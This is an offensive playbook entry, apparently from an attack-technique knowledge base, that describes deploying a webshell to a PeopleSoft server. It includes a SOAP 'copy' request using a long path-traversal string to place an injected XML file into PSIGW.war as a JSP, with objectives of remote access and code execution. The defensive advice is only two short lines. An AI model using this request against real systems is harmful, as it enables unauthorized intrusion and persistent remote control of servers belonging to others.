---
tags:
  - file-deployment
  - path-traversal
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/post-soap-copy-to-webroot]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Server Software Component]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7c511493-dd14-482e-966e-9610adadc5a9
created_at: '2025-12-13T09:00:33.625Z'
updated_at: '2025-12-13T09:00:33.625Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Server Software Component]]'
---
# Deploy Modified XML to Webroot JSP

## Summary

This procedure copies the modified XML to a JSP file in the webroot, making the webshell accessible.

## Description

Using another SOAP copy request, the injected XML is moved to PSIGW.war as a JSP file via path traversal.

## Requirements

1. Modified file in temp
2. Deployed service access
3. Path traversal knowledge

## Defense

Defensive measures and detection strategies:

- Restrict directory traversals
- Log and alert on file copies to webroot

## Objectives

1. Deploy webshell
2. Enable remote access
3. Set up for RCE

## Instructions

### Step 1: Send Deployment Request

**Context**: Copy to webroot.

**Command** ([[commands/post-soap-copy-to-webroot]]):
```bash
POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
...
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope ...>
<soapenv:Body>
<api:copy ...>
<in0 xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in0>
<in1 xsi:type="xsd:string">./applications/peoplesoft/PSIGW.war/PVrIiSDNAQlOQubhYHDE.jsp</in1>
</api:copy>
</soapenv:Body>
</soapenv:Envelope>
```

> This deploys the JSP to the webroot.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[Server Software Component]]

### Sub-Techniques



## Commands Used

- [[commands/post-soap-copy-to-webroot]]

## Tools Used

- [[tools/curl]]

## Tags

- file-deployment
- path-traversal
